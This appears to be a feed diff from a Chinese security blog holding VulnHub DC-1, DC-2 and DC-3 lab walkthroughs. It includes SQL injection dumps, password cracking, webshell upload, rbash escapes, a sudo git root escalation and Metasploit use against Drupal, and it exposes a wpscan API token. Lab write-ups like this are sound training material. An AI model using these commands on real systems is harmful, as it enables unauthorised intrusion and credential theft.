+第一个ALL：之网络中的主机，我也不知道什么意思，但是这个all还是不动好了<br>
+第二个(ALL:ALL)：指以谁的身份去执行，root就行了<br>
+第三个ALL：指所有的命令，可以自己制定，比如/bin/ls,/bin/nc</p>
+</blockquote>
+<p>看一下例子：代表用户zaq可以以root的权限运行ls指令</p>
+<figure data-type="image" tabindex="23"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwl1b033efa96b85722688bae6eac24c627.png" alt="img" loading="lazy"></figure>
+<p>前边要加sudo，可以看到zaq用户成功查看了/root目录的结构</p>
+<figure data-type="image" tabindex="24"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwl393b74d7b3c173e769d12a547f1bdd65.png" alt="img" loading="lazy"></figure>
+<p>sudo -l 显示出自己（执行 sudo 的使用者）的权限</p>
+<figure data-type="image" tabindex="25"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwl23bbc820c6e50616c9e21eddfaec06a1.png" alt="img" loading="lazy"></figure>
+<p>所以我们可以使用payload，让charles用户用sudo无密码执行各种命令，实现权限的提升。</p>
+<h2 id="总结">总结</h2>
+<p>提权部分参考百度</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[每周靶机渗透记录-DC3]]></title>
+        <id>https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc3/</id>
+        <link href="https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc3/">
+        </link>
+        <updated>2023-09-08T12:24:09.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="vulnhubdc-3">vulnhubDC-3</h1>
+<h2 id="1信息收集">1.信息收集</h2>
+<figure data-type="image" tabindex="1"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504202030142.png" alt="image-20230504202030142" loading="lazy"></figure>
+<p>确定目标ip192.168.131.137</p>
+<figure data-type="image" tabindex="2"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504202325470.png" alt="image-20230504202325470" loading="lazy"></figure>
+<p>This time, there is only one flag, one entry point and no clues.</p>
+<p>To get the flag, you'll obviously have to gain root privileges.</p>
+<p>How you get to be root is up to you - and, obviously, the system.</p>
+<p>Good luck - and I hope you enjoy this little challenge. 😃</p>
+<p>这一次，只有一面旗帜，一个入口，没有线索。</p>
+<p>要获得该标志，显然必须获得根权限。</p>
+<p>如何成为根取决于你自己，当然也取决于系统。</p>
+<p>祝你好运——我希望你喜欢这个小挑战。：-）</p>
+<h3 id="扫描端口">扫描端口</h3>
+<p>nmap -sV -sC -A -p- 192.168.131.137</p>
+<figure data-type="image" tabindex="3"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504202718676.png" alt="image-20230504202718676" loading="lazy"></figure>
+<h3 id="whatweb探测站点信息">whatweb探测站点信息</h3>
+<p>whatweb -v 193.168.131.137</p>
+<figure data-type="image" tabindex="4"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504202929056.png" alt="image-20230504202929056" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504202942118.png" alt="image-20230504202942118" loading="lazy"></figure>
+<p>好像没啥用问题不大</p>
+<h3 id="敏感目录扫描">敏感目录扫描</h3>
+<p>nikto -host 192.168.131.137</p>
+<figure data-type="image" tabindex="6"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504203130833.png" alt="image-20230504203130833" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504203221144.png" alt="image-20230504203221144" loading="lazy"></figure>
+<p>发现/administrator/index.php 访问</p>
+<figure data-type="image" tabindex="8"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504203301473.png" alt="image-20230504203301473" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504203320276.png" alt="image-20230504203320276" loading="lazy"></figure>
+<p>joomla cms</p>
+<h1 id="漏洞查找和利用">漏洞查找和利用</h1>
+<p>perl joomscan.pl --url 192.168.131.137</p>
+<figure data-type="image" tabindex="10"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504205719981.png" alt="image-20230504205719981" loading="lazy"></figure>
+<p>版本号<img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504205749687.png" alt="image-20230504205749687" loading="lazy"></p>
+<p>后台地址<img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504205821577.png" alt="image-20230504205821577" loading="lazy"></p>
+<figure data-type="image" tabindex="11"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504205828100.png" alt="image-20230504205828100" loading="lazy"></figure>
+<h3 id="msf搜对应版本漏洞">msf搜对应版本漏洞</h3>
+<figure data-type="image" tabindex="12"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504210207241.png" alt="image-20230504210207241" loading="lazy"></figure>
+<p>存在sql注入漏洞</p>
+<p>选一个字典复制</p>
+<p>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt f9f.txt</p>
+<figure data-type="image" tabindex="13"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504210554458.png" alt="image-20230504210554458" loading="lazy"></figure>
+<h3 id="sqlmap跑">sqlmap跑</h3>
+<p>直接用上面语句</p>
+<figure data-type="image" tabindex="14"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504210853137.png" alt="image-20230504210853137" loading="lazy"></figure>
+<p>在原来语句把dbs改为current-dbs 爆出 现在dbs</p>
+<figure data-type="image" tabindex="15"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504211200876.png" alt="image-20230504211200876" loading="lazy"></figure>
+<p>-D &quot;joomladb&quot; --tables 爆出库里的表</p>
+<figure data-type="image" tabindex="16"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504211423239.png" alt="image-20230504211423051" loading="lazy"></figure>
+<p>-D &quot;joomladb&quot; -T &quot;#__users&quot; --columns 找到user表 爆出表里列</p>
+<figure data-type="image" tabindex="17"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504211648025.png" alt="image-20230504211648025" loading="lazy"></figure>
+<p>接下里都打印出来就行了-D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;email,id,params,username,name,password&quot; --dump</p>
+<figure data-type="image" tabindex="18"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504211832911.png" alt="image-20230504211832911" loading="lazy"></figure>
+<p>密码加密了直接john爆破</p>
+<figure data-type="image" tabindex="19"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504212135986.png" alt="image-20230504212135986" loading="lazy"></figure>
+<p>snoopy</p>
+<figure data-type="image" tabindex="20"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504212206466.png" alt="image-20230504212206466" loading="lazy"></figure>
+<p>登入后台成功</p>
+<figure data-type="image" tabindex="21"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504213718791.png" alt="image-20230504213718791" loading="lazy"></figure>
+<p>后台发现上传点 上传一句话木马</p>
+<figure data-type="image" tabindex="22"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504214128414.png" alt="image-20230504214128414" loading="lazy"></figure>
+<p>蚁剑链接成功 但是权限不是root需要提权</p>
+<figure data-type="image" tabindex="23"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504214645846.png" alt="image-20230504214645846" loading="lazy"></figure>
+<p>lsb_release -a</p>
+<p>获取到版本号</p>
+<p>ubuntu 16.04</p>
+<p>继续msf搜索系统版本的提权漏洞</p>
+<figure data-type="image" tabindex="24"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504214950058.png" alt="image-20230504214950058" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504215229457.png" alt="image-20230504215229457" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504214936135.png" alt="image-20230504214936135" loading="lazy"></figure>
+<p>访问网站下载 解压 文件</p>
+<figure data-type="image" tabindex="27"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504220206355.png" alt="image-20230504220206355" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504220254433.png" alt="image-20230504220254433" loading="lazy"></figure>
+<p>下载该文件</p>
+<p>tar -xvf exploit.tar</p>
+<figure data-type="image" tabindex="29"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504220338590.png" alt="image-20230504220338590" loading="lazy"></figure>
+<p>解压</p>
+<figure data-type="image" tabindex="30"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504220546668.png" alt="image-20230504220546668" loading="lazy"></figure>
+<p>蚁剑上无法成功用冰蝎 先上穿冰蝎马</p>
+<figure data-type="image" tabindex="31"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504220703323.png" alt="image-20230504220703323" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504220825875.png" alt="image-20230504220825875" loading="lazy"></figure>
+<p>成功</p>
+<figure data-type="image" tabindex="33"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504221025039.png" alt="image-20230504221025039" loading="lazy"></figure>
+<p>提权成功</p>
+<figure data-type="image" tabindex="34"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504221039845.png" alt="image-20230504221039845" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230504221150615.png" alt="image-20230504221150615" loading="lazy"></figure>
+<p>到root目录找到唯一flag</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[每周靶机渗透记录-DC2]]></title>
+        <id>https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc2/</id>
+        <link href="https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc2/">
+        </link>
+        <updated>2023-09-08T12:23:30.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="每周靶机渗透dc-2">每周靶机渗透DC-2</h1>
+<h2 id="环境配置">环境配置</h2>
+<p>在官网下载dc-2 压缩包 解压后用VM打开 打开后将网络适配器那里改为 NAT模式</p>
+<h2 id="信息收集">信息收集</h2>
+<h3 id="1找到被攻击靶机ip">1.找到被攻击靶机ip</h3>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416185625089.png" alt="image-20230416185625089" loading="lazy"></figure>
+<p>排除已知几个 剩下 192.168.131.133位靶机ip其中192.168.131.128是我另一台kali的ip</p>
+<h3 id="2先去访问-这个ip-找有用信息">2.先去访问 这个ip 找有用信息</h3>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416185426949.png" alt="image-20230416185426949" loading="lazy"></figure>
+<p>这里访问失败 先放着</p>
+<h3 id="3nmap-或者-fscan等其他工具扫描ip-看有无可利用的端口">3.nmap 或者 fscan等其他工具扫描ip 看有无可利用的端口</h3>
+<p>nmap -sC -sV -A -p- 192.168.131.133</p>
+<p>-p- 是扫描该ip下所有端口</p>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416185738316.png" alt="image-20230416185738316" loading="lazy"></figure>
+<p>这里可以发现 ssh端口被改为 7744端口 通常位22</p>
+<p>还可以发现 该网页CMS是WordPress 这里可以联想到wpscan</p>
+<h3 id="4回到网页">4.回到网页</h3>
+<p>发现网址栏 变成了 http://dc-2/ 而非 http://192.168.131.133</p>
+<p>可以联想应该是靶机做了设置会把ip强制转换为域名导致DNS解析不到ip地址 这时候我们需要在 host文件里自己加上这个域名对应的ip地址</p>
+<p>vim /etc/hosts</p>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416190811288.png" alt="image-20230416190811288" loading="lazy"></figure>
+<p>:wq 保存退出 这时候我们在kali的浏览器上访问ip</p>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416190915912.png" alt="image-20230416190915912" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416190940131.png" alt="image-20230416190940131" loading="lazy"></figure>
+<p>在页面找到第一个flag</p>
+<p>Flag</p>
+<p>Flag 1:</p>
+<p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
+<p>More passwords is always better, but sometimes you just can’t win them all.</p>
+<p>Log in as one to see the next flag.</p>
+<p>If you can’t find it, log in as another.</p>
+<p>大概意思是我们常规的字典是不行的 需要cewl爆破密码</p>
+<p>登入去找另外一个flag</p>
+<p>所以我们要找登入界面</p>
+<h3 id="5目录遍历找登入页面">5.目录遍历找登入页面</h3>
+<p>用dirsearch 扫描ip</p>
+<p>python3 dirsearch.py -u 192.168.131.133 -e*</p>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416191353406.png" alt="image-20230416191353406" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416191457508.png" alt="image-20230416191457508" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416191505931.png" alt="image-20230416191505931" loading="lazy"></figure>
+<p>找到了登入界面并且发现了网站信息泄露</p>
+<p>前面知道网站CMS时WordPress 所以可以用wpscan扫描其用户</p>
+<p>再用cewl爆破出密码 就可以登录</p>
+<h3 id="6wpscan">6.wpscan</h3>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230416192108072.png" alt="image-20230416192108072" loading="lazy"></figure>
+<p>第一次扫描失败 没有 api值</p>
+<p>后来翻qiang搞到api 还是不行 一看别人wp 才知道我的wpscan语句错了</p>
+<p>先给正确的   wpscan --url dc-2 -e u</p>
+<p>我的是</p>
+<p>wpscan --api-token sGfbxq5WAbbXalQLs6L7DYavL1mjxapDhrZC0weE8zo --url http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.131.133%2Fwp-admin%2F&amp;reauth=1 -e u</p>
+<p>错误在我扫的url错了  url 应该就是那个ip所定向的网址 dc-2</p>
+<figure data-type="image" tabindex="11"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417003152793.png" alt="image-20230417003152793" loading="lazy"></figure>
+<p>发现用户有三个 分别是 admin jerry tom</p>
+<p>接下来用cewl 生成密码字典 同理也是 扫dc-2</p>
+<p>cewl dc-2 -w wordlist.txt</p>
+<figure data-type="image" tabindex="12"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417233059781.png" alt="image-20230417233059781" loading="lazy"></figure>
+<p>在同目录下创建user.txt 并把wpscan扫出的用户名输入进去</p>
+<p>然后爆破 出用户名对应密码</p>
+<p>wpscan --url dc-2 -U user.txt -P wordlist.txt</p>
+<figure data-type="image" tabindex="13"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417233329165.png" alt="image-20230417233329165" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417233348760.png" alt="image-20230417233348760" loading="lazy"></figure>
+<p>[SUCCESS] - jerry / adipiscing<br>
+[SUCCESS] - tom / parturient</p>
+<p>可以看到两个用户 和他的密码被爆破成功</p>
+<h3 id="7直接去登录他页面找信息">7.直接去登录他页面找信息</h3>
+<p>登入jerry用户看到在page索引下看到flag2</p>
+<figure data-type="image" tabindex="15"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417234510138.png" alt="image-20230417234510138" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417234526624.png" alt="image-20230417234526624" loading="lazy"></figure>
+<p>Flag 2<br>
+Edit &quot;Flag 2&quot;</p>
+<p>Flag 2:</p>
+<p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
+<p>Hope you found another entry point.</p>
+<p>如果不能通过WordPress走捷径 你需要找到另一个切入点</p>
+<h3 id="8通过网页上传shell">8.通过网页上传shell</h3>
+<p>我先想到网页里有很多种上传方式  我试着上传php文件 但是失败了</p>
+<p>尝试写入一句话木马也是不行</p>
+<p>想到一开始nmap扫到7744端口 可能可以ssh连接</p>
+<h3 id="9ssh连接">9.ssh连接</h3>
+<figure data-type="image" tabindex="17"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417235453353.png" alt="image-20230417235453353" loading="lazy"></figure>
+<p>用tom连接成功</p>
+<figure data-type="image" tabindex="18"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230417235531606.png" alt="image-20230417235531606" loading="lazy"></figure>
+<p>目录下可以看到flag3.txt 但是无法用cat读取 遇到知识盲区了</p>
+<p>上网查发现这里用的rbash限制 需要绕过</p>
+<p>绕过rbash</p>
+<p>BASH_CMDS[a]=/bin/sh;a</p>
+<p>/bin/bash</p>
+<p>添加环境变量</p>
+<p>export PATH=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mi>A</mi><mi>T</mi><mi>H</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi>b</mi><mi>i</mi><mi>n</mi><mi mathvariant="normal">/</mi><mi>e</mi><mi>x</mi><mi>p</mi><mi>o</mi><mi>r</mi><mi>t</mi><mi>P</mi><mi>A</mi><mi>T</mi><mi>H</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">PATH:/bin/
+export PATH=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">/</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>PATH:/usr/bin</p>
+<figure data-type="image" tabindex="19"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418000700579.png" alt="image-20230418000700579" loading="lazy"></figure>
+<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>
+<p>可怜的老汤姆总是追着杰里跑。也许他应该为他造成的所有压力负责。</p>
+<p>没理解啥意思 就继续按常规套路往下做</p>
+<h3 id="10cat-etcpasswd">10.cat  /etc/passwd</h3>
+<p>我想变交互式  <img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418001048233.png" alt="image-20230418001048233" loading="lazy"></p>
+<p>但不行</p>
+<p>那直接 cat /etc/passwd</p>
+<figure data-type="image" tabindex="20"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418001130192.png" alt="image-20230418001130192" loading="lazy"></figure>
+<p>爆出里面有jerry 那就联想到</p>
+<p>Perhaps he should su for all the stress he causes.</p>
+<p>su jerry flag3可能先提到jerry的意思吗</p>
+<figure data-type="image" tabindex="21"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418001334073.png" alt="image-20230418001334073" loading="lazy"></figure>
+<p>果然 但是要密码 前面ssh时web密码是错的</p>
+<p>但我这里还是不知道密码只能试试之前的web密码</p>
+<p>adipiscing</p>
+<figure data-type="image" tabindex="22"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230418001530039.png" alt="image-20230418001530039" loading="lazy"></figure>
+<p>成功...</p>
+<figure data-type="image" tabindex="23"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418001634212.png" alt="image-20230418001634212" loading="lazy"></figure>
+<p>找到第四个flag</p>
+<p>Good to see that you've made it this far - but you're not home yet.</p>
+<p>You still need to get the final flag (the only flag that really counts!!!).</p>
+<p>No hints here - you're on your own now.  😃</p>
+<p>Go on - git outta here!!!!</p>
+<p>这里很明显看到git 然后还有一个flag 肯定是要提到root权限才能拿到的</p>
+<h3 id="11提权">11.提权</h3>
+<p>提权先想到 找二进制文件</p>
+<p>find / -perm -4000 2&gt;/dev/null</p>
+<figure data-type="image" tabindex="24"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418001943717.png" alt="image-20230418001943717" loading="lazy"></figure>
+<p>都用不上</p>
+<p>这时候sudo -l 看看有没有jerry可以用的一些root级别命令</p>
+<figure data-type="image" tabindex="25"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418002404496.png" alt="image-20230418002404496" loading="lazy"></figure>
+<p>发现了git 和前面提示对上</p>
+<h3 id="git提权">git提权</h3>
+<p>sudo git help config</p>
+<p>输入该命令会强制进入交互状态</p>
+<p>在调用 bash</p>
+<p>!/bin/bash</p>
+<figure data-type="image" tabindex="26"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418003023363.png" alt="image-20230418003023363" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418003034442.png" alt="image-20230418003034442" loading="lazy"></figure>
+<p>成功提权</p>
+<figure data-type="image" tabindex="28"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230418003131515.png" alt="image-20230418003131515" loading="lazy"></figure>
+<hr>
+<p>/ / /\ \ ___| | |   <strong>| | ___  _ __   ___  / <br>
+\ /  / / _ \ | |  / <em>` |/ _ | '</em> \ / _ /  /<br>
+\  /\  /  <strong>/ | | | (<em>| | (</em>) | | | |  <strong>/_/<br>
+/  / _</strong>|<em>|</em>|  _<em>,</em>|_</strong>/|<em>| |</em>|_</strong>/</p>
+<p>Congratulatons!!!</p>
+<p>A special thanks to all those who sent me tweets<br>
+and provided me with feedback - it's all greatly<br>
+appreciated.</p>
+<p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p>
+<h2 id="总结">总结</h2>
+<p>这个靶机用到了wpscan爆破用户和配合密码本爆破密码  还有cewl密码本生成</p>
+<p>还有一开始重定向失败 无法访问靶机地址 DNS解析失败 需要vim /etc/hosts    定向ip到域名</p>
+<h3 id="还有rbash绕过-第一次遇到">还有rbash绕过 第一次遇到</h3>
+<h4 id="利用vi绕过rbash">利用vi绕过rbash</h4>
+<pre><code class="language-shell">vi
+:set shell=/bin/bash
+:shell
+export PATH=/bin:/usr/bin:$PATH
+</code></pre>
+<h4 id="利用bash_cmds绕过rbash">利用BASH_CMDS绕过rbash</h4>
+<p>BASH_CMDS[A]=/bin/bash<br>
+A<br>
+export PATH=/bin:/usr/bin:$PATH</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[每周靶机渗透记录-DC1]]></title>
+        <id>https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc1/</id>
+        <link href="https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc1/">
+        </link>
+        <updated>2023-09-08T12:22:15.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="每周靶机渗透之dc-1">每周靶机渗透之DC-1</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<h3 id="dc-1靶机下载">DC-1靶机下载：</h3>
+<p>官网地址：https://www.vulnhub.com/entry/dc-1,292/</p>
+<h3 id="靶机安装">靶机安装</h3>
+<p>我这里是直接用VM打开dc1.ova文件</p>
+<h2 id="信息收集">信息收集</h2>
+<p>老样子先找靶机IP</p>
+<p>在kali上输入命令arp-scan -l</p>
+<figure data-type="image" tabindex="1"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409145449087.png" alt="image-20230409145449087" loading="lazy"></figure>
+<p>我这里开了两个靶机环境 排除掉我知道的剩下的那个 192.168.131.130就是dc1靶机地址</p>
+<p>访问 地址</p>
+<figure data-type="image" tabindex="2"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409145640312.png" alt="image-20230409145640312" loading="lazy"></figure>
+<p>看到登入界面 先尝试弱口令（不行）</p>
+<p>万能密码（不行）</p>
+<p>先放着</p>
+<p>用nmap扫端口继续收集有用信息</p>
+<p>nmap -sC -A -sV 192.168.131.130</p>
+<figure data-type="image" tabindex="3"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409150435935.png" alt="image-20230409150435935" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409150549623.png" alt="image-20230409150549623" loading="lazy"></figure>
+<p>80端口这里可以发现很多有用信息</p>
+<figure data-type="image" tabindex="5"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409150737761.png" alt="image-20230409150737761" loading="lazy"></figure>
+<p>访问robots.txt</p>
+<figure data-type="image" tabindex="6"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409151826105.png" alt="image-20230409151826105" loading="lazy"></figure>
+<p>这里用到一个插件 直接得到网页是基于Drupal7 的框架下用 php语言编写搭建的</p>
+<p>这里因为得到了网页框架版本 直接kali searchsploit命令去搜这个框架的漏洞  searchsploit Drupal 7.x</p>
+<figure data-type="image" tabindex="7"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409152230597.png" alt="image-20230409152230597" loading="lazy"></figure>
+<p>这个框架下有很多漏洞 我们这里用最后一个 远程代码执行漏洞</p>
+<figure data-type="image" tabindex="8"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409152434812.png" alt="image-20230409152434812" loading="lazy"></figure>
+<p>接下来要利用漏洞 我先更新一下 自己kali上的msf库</p>
+<p>msfdb init</p>
+<figure data-type="image" tabindex="9"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409152644946.png" alt="image-20230409152644946" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409152926066.png" alt="image-20230409152926066" loading="lazy"></figure>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>用第七个漏洞 直接使用该漏洞模块 用info查看该漏洞相关信息</p>
+<figure data-type="image" tabindex="11"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409153112952.png" alt="image-20230409153112952" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409153414331.png" alt="image-20230409153414331" loading="lazy"></figure>
+<p>设置目标地址 192.168.131.130  然后输入run命令 进入shell环境</p>
+<figure data-type="image" tabindex="13"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409153551922.png" alt="image-20230409153551922" loading="lazy"></figure>
+<p>ls  cat flag1.txt 得到第一个flag</p>
+<p>Every good CMS needs a config file - and so do you.</p>
+<p>每个好的CMS都需要一个配置文件——你也一样。</p>
+<p>根据提示直接找配置文件  在这之前先将shell变成可交互环境 用python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' 反弹一个完整的shell环境</p>
+<figure data-type="image" tabindex="14"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409154045342.png" alt="image-20230409154045342" loading="lazy"></figure>
+<p>然后就是一个个目录去翻</p>
+<figure data-type="image" tabindex="15"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409154345119.png" alt="image-20230409154345119" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409154530143-16810263312391-16810263318703.png" alt="image-20230409154530143" loading="lazy"></figure>
+<p>最终在 sites default settings.php 文件里找到flag2</p>
+<p>flag2</p>
+<ul>
+<li>Brute force and dictionary attacks aren't the</li>
+<li>only ways to gain access (and you WILL need access).</li>
+<li>What can you do with these credentials?</li>
+</ul>
+<p>*暴力攻击和字典攻击不是<br>
+*只有获得访问权限的方法(并且你将需要访问权限)。<br>
+*你能用这些证书做什么?</p>
